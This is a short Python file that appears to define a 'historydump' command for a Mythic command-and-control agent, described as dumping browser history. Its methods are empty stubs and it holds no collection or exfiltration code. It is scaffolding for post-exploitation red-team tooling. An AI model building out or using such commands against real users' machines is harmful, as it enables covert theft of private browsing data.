import json

from mythic_payloadtype_container.MythicCommandBase import *


class HistoryDumpArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {}

    async def parse_arguments(self):
        pass


class HistoryCommand(CommandBase):
    cmd = "historydump"
    needs_admin = False
    help_cmd = "historydump"
    description = "Dump browser history"
    version = 1
    author = "@sysop_host"
    argument_class = HistoryDumpArguments
    attackmapping = []

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, response: AgentResponse):
        pass
